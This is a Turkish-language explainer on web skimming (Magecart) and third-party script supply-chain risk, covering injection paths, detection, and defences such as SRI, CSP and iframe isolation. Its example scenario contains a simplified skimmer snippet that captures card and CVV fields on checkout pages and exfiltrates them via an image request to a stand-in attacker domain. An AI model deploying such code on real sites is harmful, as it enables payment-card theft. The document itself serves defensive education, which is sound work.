# Web Skimming / Magecart ve Üçüncü Taraf Script Tedarik Zinciri Riski

## Tanım

**Web skimming** (tarayıcı tarafında kart bilgisi hırsızlığı), bir web sayfasında çalışan kötü niyetli JavaScript'in, kullanıcının forma girdiği hassas verileri (kredi kartı numarası, CVV, son kullanma tarihi, ad-soyad, adres, giriş bilgileri) doğrudan tarayıcı içinde okuyup saldırganın kontrolündeki bir sunucuya sızdırmasıdır. Fiziksel POS cihazlarına takılan "skimmer" aygıtlarının dijital karşılığıdır; bu yüzden bazen **e-skimming** ya da **digital skimming** olarak da anılır.

**Magecart**, bu tür saldırıları yürüten çok sayıda ayrı tehdit grubuna verilen çatı isimdir. İsim, ilk büyük dalgada yoğun biçimde hedef alınan **Magento** e-ticaret platformundan gelir; ancak günümüzde saldırılar Magento ile sınırlı değildir ve özel yazılmış ödeme sayfalarından WordPress/WooCommerce, OpenCart, Shopify tarzı platformlara kadar her yeri kapsar. Magecart tek bir grup ya da tek bir zafiyet değildir; ortak bir **saldırı sınıfının** adıdır.

Bu konunun tedarik zinciri boyutu kritiktir: modern bir ödeme sayfası nadiren "kendi kodu"ndan ibarettir. Sayfaya analitik (analytics), reklam, canlı destek widget'ı, A/B test aracı, etiket yöneticisi (tag manager), yorum/derecelendirme bileşeni ve hatta ödeme sağlayıcısının kendi script'i **üçüncü taraf `<script src="...">`** olarak dahil edilir. Bu script'lerden **herhangi biri** ele geçirilirse, saldırgan sitenin kendi altyapısına hiç dokunmadan tam yetkiyle sayfada kod çalıştırabilir. İşte web skimming'in "tek bir sunucu kırılmadan yüzlerce siteyi vurabilmesinin" kök nedeni budur.

## Kök Neden ve Çalışma Mantığı

### Tarayıcı güven modelinin düz yapısı

Bir web sayfasına dahil edilen her JavaScript, **aynı origin altında ve aynı yetkiyle** çalışır. `checkout.magaza.com` sayfasına eklenmiş bir analytics script'i, sayfanın kendi kodu ile birebir aynı ayrıcalıklara sahiptir: DOM'u okuyabilir, form alanlarına erişebilir (`document.querySelector('input[name=cardnumber]').value`), event listener ekleyebilir, `fetch`/`XMLHttpRequest` ile veri gönderebilir. Tarayıcı, bir script'in "senin script'in mi yoksa Google'ın mı" olduğunu **çalışma zamanında ayırt etmez**. Bu düz güven modeli, tedarik zinciri riskinin temelidir: bir script'e güvenmek, o script'in geldiği **tüm yolculuğa** güvenmek demektir.

### Enjeksiyon yolları (skimmer sayfaya nasıl girer)

Skimmer kodunun sayfaya girmesinin başlıca yolları:

1. **Sunucu tarafı kompromizasyon (ilk taraf).** Saldırgan e-ticaret sunucusunu doğrudan ele geçirir; savunmasız bir eklenti (plugin), güncellenmemiş CMS çekirdeği, zayıf yönetici parolası, ya da bir web shell aracılığıyla. Sonra ödeme şablonuna (template) ya da bir JS dosyasına skimmer'ı ekler. Bu klasik Magecart senaryosudur.

2. **Üçüncü taraf tedarikçi kompromizasyonu (supply chain).** Saldırgan tek bir siteyi değil, yüzlerce siteye script sağlayan bir **tedarikçiyi** ele geçirir. Ele geçirdiği script bir sonraki dağıtımda tüm müşteri sitelerine skimmer'ı taşır. Gerçek dünyada en yıkıcı örnekler bu kategoridedir: bir chatbot/widget sağlayıcısının ya da analytics servisinin ele geçirilmesiyle onlarca-yüzlerce ticaret sitesinin **aynı anda** kart sızdırmaya başlaması. Tek bir noktadan çok sayıda kurban — bu, saldırganın ölçek ekonomisidir.

3. **Kaynak kütüphane / CDN kompromizasyonu.** Sayfanın çektiği bir açık kaynak kütüphanenin (ya da onu barındıran bir CDN hesabının) ele geçirilmesi. Ayrıca **terk edilmiş ama sayfada hâlâ referanslı** kaynaklar: bir alan adının süresi dolar, saldırgan onu kapar (bkz. subdomain/domain takeover), ve o adrese işaret eden eski `<script src>` etiketi artık saldırganın kodunu yükler.

4. **İstemci tarafı enjeksiyon.** DOM-based XSS, güvensiz `postMessage` işleyicileri, ya da kullanıcı tarafından kontrol edilen içerikle script yükleyen tag manager yapılandırmaları. Tag manager'lar özellikle riskli bir "meta-enjeksiyon" yüzeyidir: pazarlama ekibinin kod incelemesi görmeden panelden eklediği bir etiket, doğrudan üretimdeki ödeme sayfasında keyfi JavaScript çalıştırabilir.

### Skimmer'ın davranışı

Sayfaya girdikten sonra tipik bir skimmer şu adımları izler:

- **Hedef tespiti.** URL'de `checkout`, `payment`, `cart` gibi kalıpları ya da sayfada kart alanı içeren bir form olup olmadığını kontrol eder. Sadece ödeme akışında aktifleşerek gürültüyü ve tespiti azaltır.
- **Veri yakalama.** Form alanlarına `input`/`change`/`keyup` dinleyicileri bağlar, form `submit` olayını yakalar, ya da düzenli aralıklarla alan değerlerini okur. Bazı gelişmiş varyantlar, gerçek ödeme iframe'inin **üstüne** sahte bir aşırı katman (overlay) form bindirir (form-jacking).
- **Sızdırma (exfiltration).** Toplanan veri Base64/URL-encode edilip, bir görsel isteği (`new Image().src = "https://kotu-alan/collect?d=..."`), `fetch`, `navigator.sendBeacon` ya da WebSocket üzerinden dışarı gönderilir. Sızdırma alanı çoğu zaman meşru bir servise **benzer** yazılır (typosquatting: `google-analytiics[.]com`, `jquery-cdn[.]net` gibi) — bu, ağ günlüklerinde göze batmamak içindir.
- **Gizlenme.** Kod yoğun biçimde obfuscate edilir; string'ler şifrelenir, geliştirici araçları (DevTools) açık algılanınca durur, ya da yalnızca belirli coğrafyalarda/İP'lerde çalışır. Amaç, hem kullanıcının hem de savunmacının analizini zorlaştırmaktır.

## Örnek Senaryo

Bir orta ölçekli e-ticaret sitesi `magaza.com`, ödeme sayfasında üçüncü taraf bir "canlı destek" widget'ı kullanıyor. Sayfa HTML'inde şu satır var:

```html
<script src="https://cdn.destekwidget.com/loader.js"></script>
```

Saldırgan doğrudan `magaza.com` sunucusuna hiç dokunmaz. Bunun yerine, `destekwidget.com` sağlayıcısının içerik dağıtım hesabını ele geçirir ve `loader.js` dosyasının sonuna şu mantıkta bir kod ekler (kavramsal, obfuscate edilmiş halin sadeleştirilmiş özeti):

```javascript
// Meşru widget kodu... (değişmeden çalışmaya devam eder)

// Eklenen skimmer mantığı:
if (/checkout|payment/i.test(location.pathname)) {
  document.addEventListener('input', function (e) {
    // kart alanı benzeri girişleri topla
    if (/card|cvv|cvc|expiry/i.test(e.target.name)) {
      buffer[e.target.name] = e.target.value;
    }
  }, true);

  window.addEventListener('beforeunload', function () {
    // görsel isteği ile sızdırma — gürültüsüz
    new Image().src =
      'https://destek-widget-cdn[.]net/px.gif?d=' +
      btoa(JSON.stringify(buffer));
  });
}
```

Sonuç: `magaza.com` ve aynı widget'ı kullanan **tüm diğer siteler** ödeme sayfalarında sessizce kart verisi sızdırmaya başlar. Site sahibinin sunucusunda hiçbir iz yoktur; loglar temizdir; site sahibi "biz hacklenmedik" der ve teknik olarak da haklıdır — **kendi** sunucusu hacklenmemiştir. Kırılan halka tedarikçiydi. Bu, tedarik zinciri riskinin en can yakıcı yönüdür: sorumluluk (ve müşteri kaybı) sizde, ama kontrol sizde değildi.

## Tespit

Web skimming, sunucu loglarında iz bırakmadığı için **istemci tarafı ve dışarıdan** görünürlük gerektirir.

**Envanter ve değişiklik izleme (en temel savunma).** Ödeme sayfalarınızda yüklenen **her** script'in bir envanterini çıkarın: kaynağı (hostname), neden orada olduğu, sahibi kim. Sonra bu envanteri sürekli izleyin. Sayfaya **beklenmeyen bir yeni script** eklenmesi ya da mevcut bir script'in **hash'inin değişmesi** en güçlü erken uyarıdır. Bunu düzenli olarak sayfayı çekip (headless browser ile) yüklenen kaynakları listeleyerek ve bir referans (baseline) ile karşılaştırarak otomatikleştirin.

**Content-Security-Policy raporlaması.** CSP `report-uri` / `report-to` yönergeleriyle, politikanıza uymayan bir kaynağın yüklenmeye çalışılması ya da izin verilmeyen bir yere `fetch`/`connect` girişimi **rapor** olarak size döner. `report-only` modda başlatıp bu raporları izlemek, hem beklenmeyen sızdırma hedeflerini hem de yeni script kaynaklarını görünür kılar. CSP ihlali raporlarında tanımadığınız bir `connect-src` hedefi görmek, aktif bir skimmer'ın ilk sinyali olabilir.

**Dış (synthetic) izleme.** Bir izleme aracıyla düzenli aralıklarla ödeme akışını gerçek bir tarayıcıda simüle edin ve giden ağ isteklerini kaydedin. Tanımadığınız bir alana giden POST/GET, özellikle form verisiyle korelasyon gösteren istekler, skimmer işaretidir. Bu, kendi altyapınızdan bağımsız olduğu için tedarikçi kaynaklı kompromizasyonu da yakalar.

**Sızdırma göstergeleri (IOC benzeri sinyaller).** `new Image().src` ya da `sendBeacon` ile atipik alanlara giden istekler; typosquat alan adları (meşru servise bir-iki harf farkla benzeyen); Base64 ile kodlanmış uzun sorgu parametreleri; DevTools açıldığında değişen sayfa davranışı; yalnızca ödeme sayfasında yüklenen ve başka yerde olmayan script bloğu.

**Kod incelemesi ve fark analizi.** Şüphelenilen JS'i alıp obfuscation'ı çözerek (beautify + string decode) event listener eklenip eklenmediğine, form alanlarına erişilip erişilmediğine ve dış origin'e veri gönderilip gönderilmediğine bakın. Zamana yayılan **diff** (aynı script'in dün ve bugünkü hali) enjekte edilen bloğu genellikle net biçimde ortaya çıkarır.

## Savunma

### Subresource Integrity (SRI) — merkez savunma

**SRI**, bir `<script>` ya da `<link>` etiketine, çekilen dosyanın kriptografik **hash**'ini (SHA-256/384/512) bağlamanızı sağlar. Tarayıcı dosyayı indirdikten sonra hash'ini hesaplar; beklenen değerle **eşleşmezse dosyayı çalıştırmayı reddeder**.

```html
<script src="https://cdn.destekwidget.com/loader.js"
        integrity="sha384-BAZ_BURADA_GERCEK_HASH"
        crossorigin="anonymous"></script>
```

SRI'nin mantığı doğrudan tedarik zinciri saldırısını hedefler: tedarikçi/CDN ele geçirilip dosya **değiştirilirse**, hash artık uymaz ve skimmer **çalışmaz**. Önceki örnekteki senaryo, `loader.js` üzerinde SRI olsaydı sessizce başarısız olurdu.

**SRI'nin sınırları — dürüst olmak gerekirse:**

- SRI **statik, sürümü sabit** dosyalar için çalışır. `analytics.js` gibi sağlayıcının sürekli güncellediği, sabit içerikli olmayan dosyalarda hash her güncellemede kırılır; bu yüzden bazı büyük sağlayıcıların ana script'lerine SRI **pratikte uygulanamaz**. Bu sağlayıcılar aynı zamanda en yüksek riskli olanlardır — SRI tek başına yeterli değildir.
- SRI **ilk yükleme anını** korur; ama script çalıştıktan sonra `document.createElement('script')` ile **dinamik olarak başka bir script yüklerse**, o ikinci script SRI kapsamında değildir. Yani SRI'lı bir loader, SRI'sız bir "gerçek" yük çekebilir. Bu yüzden SRI, CSP ile birlikte kullanılmalıdır.
- SRI, dosyanın **niyetini** değil yalnızca **değişmediğini** doğrular. Sağlayıcı en baştan kötü niyetli/kompromize kod dağıtıyorsa, siz o kötü kodun hash'ini kilitlemiş olursunuz.

### Content-Security-Policy (CSP) — ikinci merkez katman

CSP, tarayıcıya "bu sayfada hangi kaynaklardan script yüklenebilir ve nereye veri gönderilebilir" kurallarını dayatır:

- **`script-src`** ile yalnızca beyaz listedeki (allowlist) origin'lerden script yüklenmesine izin verin. Enjekte edilen inline skimmer ya da yabancı bir origin'den gelen script bloklanır. `nonce` ya da `hash` tabanlı `script-src`, satır içi (inline) enjeksiyonu ciddi biçimde zorlaştırır.
- **`connect-src`** ile verinin **nereye gönderilebileceğini** sınırlayın. Skimmer'ın asıl amacı sızdırmadır; `connect-src` beyaz listenizde olmayan bir alana `fetch`/`beacon`/`WebSocket` denemesi bloklanır. Bu, "script bir şekilde çalışsa bile veriyi dışarı çıkaramaz" savunma katmanıdır ve web skimming'e karşı en değerli CSP yönergelerinden biridir.
- **`img-src`** de önemlidir: klasik `new Image().src` sızdırması bir görsel isteğidir; `img-src` sıkı tutulursa bu yol da kapanır.
- CSP'yi önce **`Content-Security-Policy-Report-Only`** ile devreye alıp raporları izleyin, sonra bloklamaya geçin. Böylece meşru trafiği kırmadan gerçek envanterinizi öğrenirsiniz.

### Diğer savunma katmanları

- **Ödeme alanlarını izole edin.** PCI DSS'in de teşvik ettiği yaklaşım: kart verisini toplayan alanları, ödeme sağlayıcısının barındırdığı bir **iframe** ya da yönlendirmeli (redirect/hosted) ödeme sayfası içinde tutun. Ana sayfadaki script'ler, farklı origin'deki iframe'in içine (Same-Origin Policy sayesinde) erişemez. Bu, skimmer'ın en değerli veriye ulaşmasını mimari olarak engeller. (Yalın form-jacking overlay saldırılarına karşı yine de dikkat gerekir.)
- **Üçüncü taraf script sayısını azaltın.** En güçlü tek hamle: gerçekten gerekmeyen her script'i ödeme sayfasından çıkarın. Ödeme akışında analytics, reklam ve sohbet widget'ının **hiçbirine** ihtiyaç yoktur çoğu zaman. Saldırı yüzeyi, oradaki script sayısıyla doğru orantılıdır.
- **Tag manager'ı yönetin.** Etiket yöneticisi üzerinden üretime kod çıkışını bir **onay/inceleme** sürecine bağlayın; herkesin panelden keyfi JS yayınlamasına izin vermeyin. Tag manager'ın kendisi de bir üçüncü taraf script'tir ve CSP kapsamına alınmalıdır.
- **Tedarikçi güvenlik değerlendirmesi.** Kritik script sağlayıcılarını (özellikle ödeme ve etiketleme) sözleşmesel ve teknik olarak değerlendirin: güvenlik duruşları, olay bildirim taahhütleri, sürüm sabitleme imkânı. Tedarikçi riskini "görünmez" bırakmayın.
- **En az ayrıcalık ve sunucu sertleştirme.** İlk taraf kompromizasyonunu önlemek için: CMS/eklenti güncellemeleri, güçlü yönetici kimlik doğrulaması (MFA), yönetici panellerine erişim kısıtı, dosya bütünlüğü izleme (FIM) ile üretim JS dosyalarındaki beklenmeyen değişikliğin alarm üretmesi.

## Yaygın Hatalar

- **"Biz hacklenmedik" yanılgısı.** Sunucu logları temiz diye rahatlamak. Skimming'in en yıkıcı biçimi tam da sizin sunucunuza dokunmayan tedarik zinciri kompromizasyonudur. Sorumluluk yine sizdedir.
- **Üçüncü taraf script'e körü körüne güvenmek.** "Google/tanınmış bir marka, güvenlidir" varsayımı. Güvendiğiniz şey markanın **niyeti** değil, o script'in ulaştığı **tüm dağıtım zinciridir** (CDN hesabı, sürüm, ele geçirilebilir altyapı).
- **SRI'yi tek çözüm sanmak.** SRI güncellenen dosyalarda kırılır, dinamik olarak yüklenen ikincil script'leri kapsamaz ve kötü niyetli-baştan kodu durdurmaz. SRI + CSP + iframe izolasyonu birlikte gerekir.
- **`crossorigin` unutmak.** SRI'nin CDN kaynakları için çalışması genellikle `crossorigin="anonymous"` gerektirir; unutulunca ya integrity kontrolü uygulanmaz ya kaynak yüklenmez. Sessizce yanlış yapılandırılan SRI, olmayan SRI kadar risklidir.
- **CSP'yi sadece `script-src` ile kurmak.** `connect-src`/`img-src` sınırlanmazsa, script bloklansa bile başka yollarla veri sızdırılabilir; ya da script bir şekilde çalışırsa sızdırma serbest kalır. Sızdırma yönlerini kapatmak, yükleme yönünü kapatmak kadar önemlidir.
- **Ödeme sayfasını gereksiz script'lerle doldurmak.** Pazarlama ve analitik ekiplerinin baskısıyla checkout sayfasına eklenen her widget, doğrudan kart hırsızlığı yüzeyini büyütür. En hassas sayfayı en sade tutmak temel bir ilkedir.
- **Tek seferlik denetim.** Bir kez SRI/CSP kurup "tamam" demek. Sürümler değişir, yeni etiketler eklenir, tedarikçiler kompromize olur. Web skimming savunması **sürekli izleme** gerektiren bir süreçtir, tek seferlik bir yapılandırma değil.

## Özet

Web skimming / Magecart, tarayıcıda çalışan güvenilmez JavaScript'in ödeme verisini çalmasıdır ve modern web'in **düz güven modeli** ile **üçüncü taraf script bağımlılığı** birleşiminden beslenir. Kök risk, sayfaya eklenen her script'in sitenizin kendi kodu ile aynı yetkiye sahip olması ve o script'in geldiği tüm tedarik zincirine güvenmek zorunda kalmanızdır. Savunma tek bir kontrol değil, katmanlıdır: script envanteri ve değişiklik izleme ile **tespit**; SRI ile dosya **bütünlüğü**; CSP `script-src`/`connect-src` ile yükleme ve sızdırma **kısıtı**; barındırılan/iframe ödeme alanları ile **izolasyon**; ve ödeme sayfasındaki üçüncü taraf script sayısını **en aza indirmek**. Bu katmanların hiçbiri tek başına yeterli değildir — ama birlikte, tek bir tedarikçinin kırılmasını sessiz bir felakete dönüşmekten alıkoyar.
